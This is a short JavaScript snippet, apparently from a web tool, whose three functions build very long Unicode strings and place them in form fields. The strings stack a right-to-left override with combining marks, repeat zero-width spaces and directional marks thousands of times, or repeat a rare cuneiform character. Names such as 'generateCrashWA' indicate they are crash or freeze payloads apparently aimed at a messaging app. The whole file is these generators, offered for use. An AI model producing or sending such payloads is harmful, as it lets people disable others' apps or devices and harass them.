function generateCrashWA() {
  const rtl = '\u202e'; // RTL override
  const zalgo = '̷̷̶̨̡̡̛͟͜͞͏̸̵̵̷̸̸̨̨̡̡̡̛͜͜͜͞͞͡͞';
  const payload = ('😈' + rtl + zalgo).repeat(1000);
  document.getElementById('crashwa').value = payload;
}

function generateInvisDelay() {
  const zwsp = '\u200B'; // Zero-width space
  const hang = '‎‎‎'; // Left-to-right mark repeated
  const payload = ('-' + zwsp + hang).repeat(5000);
  document.getElementById('invisdelay').value = payload;
}

function generateFCReyx() {
  const combo = '𒆙'.repeat(2000); // Rare unicode char
  const newline = '\n'.repeat(100);
  const payload = combo + newline + combo;
  document.getElementById('fcreyx').value = payload;
}